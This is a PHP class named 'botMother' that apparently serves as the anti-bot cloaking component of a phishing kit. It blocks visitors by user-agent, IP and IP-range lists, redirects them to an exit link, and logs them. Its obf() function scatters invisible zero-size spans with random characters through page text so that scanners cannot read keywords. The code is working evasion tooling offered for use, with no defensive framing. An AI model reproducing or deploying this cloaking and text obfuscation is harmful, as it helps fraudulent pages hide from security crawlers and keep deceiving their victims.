<?php 

class botMother{
	
    public $LICENSE_KEY                 =   "";
    public $TEST_MODE                   =   false;
    public $EXIT_LINK                   =   "";
    public $GEOS                        =   "";

    public $AGENTS_BLACKLIST_FILE       =   __DIR__ . '/AGENTS.jhn';
    public $IPS_BLACKLIST_FILE          =   __DIR__ . '/IPS.jhn';
    public $IPS_RANGE_BLACKLIST_FILE    =   __DIR__ . '/IPS_RANGE.jhn';
    public $LOGS                        =   __DIR__ . '/bots_log.txt';
    public $VISITS                      =   __DIR__ . '/log.txt';

    public $USER_AGENT                  =   "";
    public $USER_IP                     =   "";
    public $SERVER_API                  =   "";

    function __construct(){
        $this->USER_AGENT   =   $_SERVER["HTTP_USER_AGENT"] ?? '';
        $this->USER_IP      =   $this->getIp();
    }

    private function getIp() {
        if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            $ipList = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
            return trim($ipList[0]);
        }
        return $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
    }

    private function readList($file) {
        if (file_exists($file)) {
            $data = file_get_contents($file);
            if ($data !== false) {
                $lines = array_filter(array_map('trim', explode("\n", $data)));
                return $lines;
            }
        }
        return [];
    }

    private function saveLog($msg) {
        $fp = @fopen($this->LOGS, 'a');
        if ($fp) {
            fwrite($fp, "[".date("Y-m-d H:i:s")."] ".$msg . PHP_EOL);
            fclose($fp);
        }
    }

    public function isSpace($ltr){
        return preg_match('/\s+/', $ltr);
    }

    public function isValidLetter($ltr){
        return preg_match('/^[\w\.]+$/', $ltr);
    }

    public function getCrypt(){
        return '<span style="padding:0 !important; margin:0 !important; display:inline-block !important; width:0 !important; height:0 !important; font-size:0 !important;">'.substr(md5(uniqid()),0,1).'</span>';
    }

    public function obf($str){
        $text = "";
        $str = str_replace("|", "", $str);
        $strarr = str_split($str);

        foreach($strarr as $letter){
            if($this->isSpace($letter)){
                $text .= " ";
            }
            if($this->isValidLetter($letter)){
                $text .= $letter . $this->getCrypt();
            }
        }
        return $text;
    }

    public function blockByAgents(){
        $blacklist = $this->readList($this->AGENTS_BLACKLIST_FILE);
        foreach ($blacklist as $agent) {
            if (stripos($this->USER_AGENT, $agent) !== false) {
                $this->killBot("Blacklisted user-agent: $agent");
            }
        }
    }

    public function blockByIps(){
        $blacklist = $this->readList($this->IPS_BLACKLIST_FILE);
        foreach ($blacklist as $ip) {
            if ($this->USER_IP == $ip) {
                $this->killBot("Blacklisted IP: $ip");
            }
        }
    }

    public function blockByIpRanges(){
        $ranges = $this->readList($this->IPS_RANGE_BLACKLIST_FILE);
        foreach ($ranges as $range) {
            if (strpos($this->USER_IP, $range) === 0) {
                $this->killBot("Blacklisted IP range: $range");
            }
        }
    }

    private function killBot($reason){
        $this->saveLog("Bot blocked [{$this->USER_IP}] - Reason: $reason");
        header("Location: " . $this->EXIT_LINK);
        exit;
    }

    public function run(){
        $this->blockByAgents();
        $this->blockByIps();
        $this->blockByIpRanges();
        // You can add geo filter / license checks here if needed
    }

    // Setters
    public function setExitLink($url){
        $this->EXIT_LINK = $url;
    }

    public function setGeoFilter($geos){
        $this->GEOS = $geos;
    }

    public function setLicenseKey($key){
        $this->LICENSE_KEY = $key;
    }

    public function setTestMode($bool){
        $this->TEST_MODE = $bool;
    }
}

?>
